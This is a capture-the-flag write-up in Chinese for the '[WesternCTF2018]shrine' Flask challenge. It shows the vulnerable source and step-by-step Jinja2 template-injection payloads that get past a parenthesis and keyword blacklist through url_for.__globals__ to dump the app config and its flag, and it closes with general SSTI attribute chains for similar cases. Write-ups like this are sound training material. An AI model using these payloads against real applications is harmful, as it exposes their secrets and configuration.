---
title: "[WesternCTF2018]shrine"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [ssti, jinja2, flask, python]
vulnerability: Flask Jinja2 SSTI 通过内置函数绕过黑名单过滤
solved: true
flag: "flag{cf005e93-49c8-4a81-b11d-34fc2c4139cd}"
---

# [WesternCTF2018]shrine

## 题目概述
题目是一个 Flask 应用，存在 `/shrine/<path:shrine>` 路由，用户输入会直接传入 `render_template_string` 渲染，存在 SSTI 漏洞。但题目对输入进行了过滤：移除了括号 `()`，并将 `config` 和 `self` 设置为 None。

## 信息收集
访问首页直接返回源码：
```python
import flask
import os

app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')  # FLAG 存储在 app.config 中

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')  # 过滤括号
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s  # config/self 置空
    return flask.render_template_string(safe_jinja(shrine))
```

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：Jinja2 服务端模板注入 (SSTI)
- **原理**：用户输入直接传入 `render_template_string`，可执行 Jinja2 表达式
- **过滤绕过**：
  1. `config` 和 `self` 被设为 None → 通过其他对象间接访问
  2. 括号被过滤 → 使用属性访问 `.` 和字典访问 `[]`，无需调用函数
- **绕过思路**：Flask 内置函数 `url_for`、`get_flashed_messages` 等在模板中可用，通过 `__globals__` 访问全局变量，找到 `current_app` 对象，进而访问其 `config` 属性

## 利用过程（Payload + Flag）

**Step 1: 验证 SSTI**
```
/shrine/{{7*7}}  →  返回 49，确认存在 SSTI
```

**Step 2: 通过 url_for 访问全局变量**
```
/shrine/{{url_for.__globals__}}
```
返回中包含 `current_app` 对象。

**Step 3: 通过 current_app.config 获取 FLAG**
```
/shrine/{{url_for.__globals__['current_app'].config}}
```
返回配置中包含 FLAG。

**完整 Payload（URL 编码）：**
```
/shrine/%7B%7Burl_for.__globals__%5B'current_app'%5D.config%7D%7D
```

**Flag:** `flag{cf005e93-49c8-4a81-b11d-34fc2c4139cd}`

## 复现步骤
1. 访问题目首页获取源码
2. 分析过滤机制：括号被移除，config/self 被置空
3. 构造 Payload：`{{url_for.__globals__['current_app'].config}}`
4. 从返回的配置中提取 FLAG

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SSTI | /shrine/<path:shrine> | `{{url_for.__globals__['current_app'].config}}` | Jinja2 沙箱逃逸、Flask 内置函数、Python 对象属性链 |

## 知识总结（解题技巧、同类题型套路）
1. **Flask SSTI 常用内置函数**：`url_for`、`get_flashed_messages`、`request`、`lipsum` 等
2. **绕过 config 过滤**：通过 `__globals__` → `current_app` → `config` 间接访问
3. **无括号利用**：使用属性访问 `.` 和字典访问 `[]` 替代函数调用
4. **Python 对象链**：`__globals__`、`__class__`、`__mro__`、`__subclasses__` 等是 SSTI 常用属性
